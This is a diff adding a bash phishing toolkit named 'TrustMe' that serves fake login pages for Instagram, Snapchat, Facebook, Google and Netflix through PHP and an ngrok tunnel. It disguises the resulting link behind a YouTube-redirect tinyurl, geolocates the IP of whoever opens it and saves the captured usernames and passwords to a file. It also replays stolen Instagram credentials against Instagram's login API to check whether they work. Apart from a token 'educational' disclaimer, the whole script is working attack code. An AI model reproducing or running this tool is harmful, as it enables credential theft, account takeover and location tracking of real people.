@@ -1,0 +1,347 @@
+#!/bin/bash 
+#coded by Fadester
+#v1.0
+
+#colors 
+green='\033[1;32m'
+red='\e[1;91m'
+yellow='\e[0m\e[1;93m'
+lightgreen='\e[1;32m'
+farblos='\e[0m'
+BlueF='\e[1;34m'
+cyan='\e[0;36m'
+lightred='\e[101m'
+blink='\e[5m'
+magenta='\e[35m'
+
+user_id=$(id -u)
+if [[ $user_id != "0" ]]; then
+  logged_user=$(who -q | sed -n ''1','1'p')
+elif [[ $user_id == "0" ]]; then
+  logged_user=$(id | cut -d "(" -f2 | cut -d ")" -f1)
+fi
+if [[ $logged_user != root ]]; then
+  _user="$logged_user""[1000]"
+else
+  _user="$logged_user""[0]"
+fi
+
+trap 'printf "\n";stop_TrustMe;exit 1' 2
+stop_TrustMe() {
+
+break > /dev/null 2>&1
+
+if [[ $pics > 0 ]]; then
+  echo -e "$green ------>$green Photos taken:$red $pics $farblos"
+fi
+echo
+sleep 0.5
+echo -e "$BlueF[$red!$BlueF]$red Shutting down... $farblos"
+sed -i "s/$case3/google.de/g" sites/beef/login.html > /dev/null 2>&1
+rm /sites/beef/ip.txt > /dev/null 2>&1
+checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
+checkphp=$(ps aux | grep -o "php" | head -n1)
+checkssh=$(ps aux | grep -o "ssh" | head -n1)
+if [[ $checkngrok == *'ngrok'* ]]; then
+pkill -f -2 ngrok > /dev/null 2>&1
+killall -2 ngrok > /dev/null 2>&1
+fi
+if [[ $checkphp == *'php'* ]]; then
+pkill -f -2 php > /dev/null 2>&1
+killall -2 php > /dev/null 2>&1
+fi
+if [[ $checkssh == *'ssh'* ]]; then
+pkill -f -2 ssh > /dev/null 2>&1
+killall ssh > /dev/null 2>&1
+fi
+if [[ -e sendlink ]]; then
+rm -rf sendlink
+fi
+}
+
+banner() {
+
+echo -e "$red   _______                  __  $green ___ ___         $farblos"
+echo -e "$red  |       .----.--.--.-----|  |_$green|   Y   .-----.  $farblos"
+echo -e "$red  |$BlueF.$red|   | |   _|  |  |__ --|   _$green|$BlueF.$green      |  -__|  $farblos"
+echo -e "$red   -|$BlueF.$red  |-|__| |_____|_____|____$green|$BlueF.$green \_/  |_____|  $farblos"
+echo -e "$red    |$BlueF:$red  |                       $green|$BlueF:$green  |   |        $farblos"
+echo -e "$red    |$BlueF::.$red|$yellow  |                    $green|$BlueF::.$green|$BlueF:.$green |        $farblos"
+echo -e "$red     ---'$yellow  |                    $green --- ---'      "
+echo -e "$yellow           | "
+echo -e "$yellow           |$green ------$BlueF>$green Trust me its just a suspicious link $red:)$farblos"
+echo -e "$yellow           |$green ------$BlueF>$green coded by$red Fadester $farblos"
+echo -e "$yellow           |$green ------$BlueF>$green Version: $red""1.0  $farblos"
+echo -e "$yellow           |$green ------$BlueF>$green Type$red help$green for help $farblos"
+echo -e "$yellow           |$green ------$BlueF>$green Github:$red https://github.com/Fadester $farblos"
+echo
+echo -e "$blink$red""DISCLAIMER $farblos"
+echo -e "$lightred This tool was only written for educational purposes. Entering the privacy of others is illegal!$farblos"
+echo ""
+}
+
+check_requirements() {
+
+if [[ -e sendlink ]]; then
+	rm -rf sendlink
+fi
+echo -e "$BlueF[$yellow*$BlueF]$yellow Check requirements... $farblos"
+sleep 1
+printf $'\e[0m\e[1;93m[\e[1;34mngrok\e[0m\e[1;93m]\e[0m'
+if [[ -e ngrok ]]; then
+	sleep 0.2
+	echo -e "$green OK!$farblos"
+else
+	sleep 0.2
+	echo -e "$red FAIL! $farblos"
+	echo -e "$BlueF[$green+$BlueF]$yellow Installing ngrok... $farblos"
+	if [[ -e ngrok ]]; then
+		echo ""
+	else
+	echo -e "$BlueF[$green+$BlueF]$green Downloading$red Ngrok$green...$farblos"
+	arch=$(uname -a | grep -o 'arm' | head -n1)
+	arch2=$(uname -a | grep -o 'Android' | head -n1)
+	if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
+		wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
+		if [[ -e ngrok-stable-linux-arm.zip ]]; then
+			unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
+			chmod +x ngrok
+			rm -rf ngrok-stable-linux-arm.zip
+		else
+			echo -e "$BlueF[$red!$BlueF]$red Download error... $farblos"
+			exit 1
+		fi
+
+	else
+		wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1
+		if [[ -e ngrok-stable-linux-386.zip ]]; then
+			unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
+			chmod +x ngrok
+			rm -rf ngrok-stable-linux-386.zip
+		else
+			echo -e "$BlueF[$red!BlueF]$red Download error... $farblos"
+			exit 1
+		fi
+	fi
+fi
+
+fi
+sleep 0.2
+printf $'\e[0m\e[1;93m[\e[1;34mphp\e[0m\e[1;93m]\e[0m'
+command -v php > /dev/null 2>&1
+if [[ $? == 0 ]]; then
+	sleep 0.2
+	echo -e "$green   OK! $farblos"
+else
+	sleep 0.2
+	echo -e "$red   FAIL! $farblos"
+	echo -e "$BlueF[$green+$farblos]$yellow Installing php... $farblos"
+	sudo apt-get install -y php > /dev/null 2>&1
+fi
+sleep 0.2
+printf $'\e[0m\e[1;93m[\e[1;34mcurl\e[0m\e[1;93m]\e[0m'
+command -v curl > /dev/null 2>&1
+if [[ $? == 0 ]]; then
+	sleep 0.2
+	echo -e "$green  OK! $farblos"
+else
+	sleep 0.2
+	echo -e "$red  FAIL! $farblos"
+	echo -e "$BlueF[$green+$BlueF]$yellow Installing curl... $farblos"
+	sudo apt-get install -y curl > /dev/null 2>&1
+fi
+sleep 0.4
+
+}
+
+start_server() {
+
+echo ""
+if [[ -e sites/$site/ip.txt ]]; then
+rm -rf sites/$site/ip.txt
+
+fi
+if [[ -e sites/$site/usernames.txt ]]; then
+rm -rf sites/$site/usernames.txt
+
+fi
+
+echo -e "$BlueF[$yellow*$BlueF]$green Starting$red php$green server... $farblos"
+cd sites/$site && php -S 127.0.0.1:3333 > /dev/null 2>&1 &
+sleep 2
+echo -e "$BlueF[$yellow*$BlueF]$green Starting$red ngrok$green server... $farblos"
+./ngrok http 3333 > /dev/null 2>&1 &
+sleep 5
+link=$(curl -s http://127.0.0.1:4040/api/tunnels | cut -d '"' -f14)
+#tinyurl
+tinyurl=$(curl -s "http://tinyurl.com/api-create.php?url=https://www.youtube.com/redirect?v=636B9Qh-fqU&redir_token=j8GGFy4s0H5jIRVfuChglne9fQB8MTU4MjM5MzM0N0AxNTgyMzA2OTQ3&event=video_description&q=$link" | head -n1)
+echo -e "$BlueF[$yellow*$BlueF]$green Send this link to the Target:$red $link $farblos "
+echo
+echo -e "$BlueF[$yellow*$BlueF]$green Or use tinyurl:$red $tinyurl $farblos "
+if [[ $site == "beef" ]]; then
+  found_beef
+else
+  link_opened
+fi
+
+}
+
+link_opened() {
+
+  echo -e ""
+  echo -e "$BlueF[$yellow*$BlueF]$yellow Waiting for target!$red Press Ctrl + C to exit... $farblos"
+  echo ""
+  while [ true ]; do
+
+
+  if [[ -e "sites/$site/ip.txt" ]]; then
+  echo -e "$BlueF[$green+$BlueF]$green Link openend! $farblos"
+  echo ""
+  ip_found
+  rm -rf sites/$site/ip.txt
+  fi
+  sleep 0.5
+  if [[ -e "sites/$site/usernames.txt" ]]; then
+  echo -e "$BlueF[$green+$BlueF]$green Credentials found! $farblos"
+  echo ""
+  catch_credentials
+  rm -rf sites/$site/usernames.txt
+  fi
+  sleep 0.5
+
+
+  done
+
+}
+
+ip_found() {
+
+ip=$(grep -a 'IP:' sites/$site/ip.txt | cut -d " " -f2 | tr -d '\r')
+IFS=$'\n'
+ip_data=$(curl -s -L https://geo.leadboxer.com/GeoIpEngine/$ip > ipdata.txt)
+ip_range=$(cat ipdata.txt | grep "ip range" | cut -d ":" -f2)
+echo -e "$BlueF[$green+$BlueF]$green IP Range:$red$ip_range$farblos"
+useragent=$(grep 'User-Agent:' sites/$site/ip.txt | cut -d '"' -f2)
+echo -e "$BlueF[$green+$BlueF]$green Target IP:$red $ip $farblos"
+echo -e "$BlueF[$green+$BlueF]$green User-Agent:$red $useragent $farblos"
+continent=$(cat ipdata.txt | grep "continent" | cut -d ":" -f2)
+echo -e "$BlueF[$green+$BlueF]$green Continent:$red$continent $farblos"
+subContinent=$(cat ipdata.txt | grep "subContinent" | cut -d ":" -f2)
+echo -e "$BlueF[$green+$BlueF]$green Subcontinent:$red$subContinent $farblos"
+country=$(cat ipdata.txt | grep "countryName" | cut -d ":" -f2)
+echo -e "$BlueF[$green+$BlueF]$green Country:$red$country $farblos"
+country_code=$(cat ipdata.txt | grep "countryCode" | cut -d ":" -f2)
+echo -e "$BlueF[$green+$BlueF]$green Country Code:$red$country_code$farblos"
+timezone=$(cat ipdata.txt | grep "timezone" | cut -d ":" -f2)
+echo -e "$BlueF[$green+$BlueF]$green Timezone:$red$timezone $farblos"
+region=$(cat ipdata.txt | grep "regionName" | cut -d ":" -f2)
+echo -e "$BlueF[$green+$BlueF]$green Region:$red$region$farblos"
+city=$(cat ipdata.txt | grep "city" | cut -d ":" -f2)
+echo -e "$BlueF[$green+$BlueF]$green City:$red$city $farblos"
+connection=$(cat ipdata.txt | grep "connection" | cut -d ":" -f2)
+echo -e "$BlueF[$green+$BlueF]$green Connection:$red$connection $farblos "
+isp=$(cat ipdata.txt | grep "isp" | cut -d ":" -f2 | sed -n ''1','1'p')
+echo -e "$BlueF[$green+$BlueF]$green ISP:$red$isp $farblos"
+domain=$(cat ipdata.txt | grep "domain" | cut -d ":" -f2 | sed -n ''1','1'p')
+echo -e "$BlueF[$green+$BlueF]$green Domain:$red$domain$farblos"
+sudo rm -rf ipdata.txt
+
+}
+
+catch_credentials() {
+account=$(grep -o 'Account:.*' sites/$site/usernames.txt | cut -d " " -f2)
+IFS=$'\n'
+password=$(grep -o 'Pass:.*' sites/$site/usernames.txt | cut -d ":" -f2)
+echo -e "$BlueF[$green+$BlueF]$green Account:$red $account $farblos"
+echo -e "$BlueF[$green+$BlueF]$green Password:$red $password $farblos "
+echo "--------------------------------------------" >> saved.accounts.txt
+echo "Site: $site" >> saved.accounts.txt
+echo "IP: $ip" >> saved.accounts.txt
+echo "Username: $account" >> saved.accounts.txt
+echo "Password: $password" >> saved.accounts.txt
+echo "--------------------------------------------" >> saved.accounts.txt
+echo  >> saved.accounts.txt
+echo -e "$BlueF[$green+$BlueF]$green Saved > saved.accounts.txt $farblos"
+echo ""
+if [[ $site == "instagram" ]]; then
+  echo -ne "$BlueF[$green*$BlueF]$green Do you want to check the credentials for instagram? [Y/n] \n" 
+  echo -ne "$BlueF[$red!$BlueF]$red The victim could get an Email! $farblos "
+  read check_ins
+  if [[ $check_ins == "Y" || $check_ins == "y" ]]; 
+    then
+      check_credentials 
+  else
+    echo -e "$BlueF[$red!$BlueF]$red restart TrustMe $farblos" 
+    exit 1
+  fi
+fi
+echo -e "$BlueF[$] Waiting for next Credentials..., $red Press Ctrl + C to exit.. $farblos"
+}
+
+check_credentials() {
+
+echo ""
+echo -e "$BlueF[$yellow*$BlueF]$yellow Try to login as$red $account$yellow.... $farblos"
+phone="$string8-$string4-$string4-$string4-$string12"
+var2=$(echo $var | grep -o 'csrftoken=.*' | cut -d ';' -f1 | cut -d '=' -f2)
+guid="$string8-$string4-$string4-$string4-$string12"
+header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "en-US", "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'
+string4=$(openssl rand -hex 32 | cut -c 1-4)
+string12=$(openssl rand -hex 32 | cut -c 1-12)
+string8=$(openssl rand -hex 32  | cut -c 1-8)
+string16=$(openssl rand -hex 32 | cut -c 1-16)
+device="android-$string16"
+data='{"phone_id":"'$phone'", "_csrftoken":"'$var2'", "username":"'$account'", "guid":"'$guid'", "device_id":"'$device'", "password":"'$password'", "login_attempt_count":"0"}'
+IFS=$'\n'
+hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
+useragent='User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'
+
+var=$(curl -c cookie.$user -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" | grep -o "logged_in_user\|challenge\|many tries\|Please wait" | uniq );
+if [[ $var == "challenge" ]]; then echo -e "$BlueF[$green*$BlueF]$green Password correkt! $farblos" ; elif [[ $var == "logged_in_user" ]]; then echo -e "$BlueF[$green+$BlueF]$green Password correkt! $farblos" ; elif [[ $var == "Please wait" ]]; then echo -e "$BlueF Login blocked! $farblos" ; else echo -e "$BlueF[$red!$BlueF]$red Password incorrect! $farblos" ; fi ;
+if [[ -e cookie. ]]; then
+	sudo rm cookie.
+fi
+echo -e "$BlueF[$yellow*$BlueF]$yellow Please restart TrustMe... $farblos"
+exit 1
+
+}
+
+menu() {
+
+clear 
+banner 
+ 
+echo -e "$BlueF[$yellow""1$BlueF]$green Instagram $farblos"
+echo -e "$BlueF[$yellow""2$BlueF]$green Snapchat  $farblos"
+echo -e "$BlueF[$yellow""3$BlueF]$green Facebook  $farblos"
+echo -e "$BlueF[$yellow""4$BlueF]$green Google    $farblos"
+echo -e "$BlueF[$yellow""5$BlueF]$green Netflix   $farblos"
+
+echo ""
+while [[ true ]]; do
+	read -p $'\e[1;34m[\e[35m::\e[1;34m]\033[1;32mChoice:\e[1;91m ' eingabe
+	if [[ $eingabe == 1 ]]; then
+		site="instagram"
+		start_server
+	elif [[ $eingabe == 2 ]]; then
+		site="snapchat"
+		start_server
+	elif [[ $eingabe == 3 ]]; then
+		site="facebook"
+		start_server
+	elif [[ $eingabe == 4 ]]; then
+		site="google"
+		start_server
+	elif [[ $eingabe == 5 ]]; then
+		site="netflix"
+		start_server
+	else 
+		echo -e "$BlueF[$red!$BlueF]$red Invalid option! $farblos"
+	fi
+done
+}
+
+
+banner
+check_requirements
+menu
